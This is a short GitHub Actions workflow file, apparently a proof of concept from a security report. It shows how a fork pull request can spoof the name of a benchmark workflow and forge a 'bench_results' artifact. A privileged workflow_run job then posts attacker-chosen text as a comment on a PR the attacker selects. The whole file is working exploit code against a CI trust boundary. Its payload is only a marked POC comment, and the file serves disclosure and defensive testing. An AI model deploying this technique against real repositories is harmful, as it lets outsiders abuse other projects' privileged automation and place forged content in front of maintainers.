# Attacker-supplied workflow in a FORK PR. It only spoofs the name of the
# workflow that bench-comment.yml watches via workflow_run.
name: "Compare performance to base branch"
on:
  pull_request:
permissions: read-all
jobs:
  fake-bench:
    runs-on: ubuntu-latest
    steps:
      - name: Forge bench_results artifact
        run: |
          mkdir -p bench_results
          printf '1\n' > bench_results/pr_number.txt
          cat > bench_results/comparison.md <<'MD'
          ### [POC-fork] attacker-controlled comment body

          Forged from a FORK pull request through the workflow_run artifact
          trust boundary. Target PR chosen by the attacker.
          MD
      - uses: actions/upload-artifact@v4
        with:
          name: bench_results
          path: bench_results/
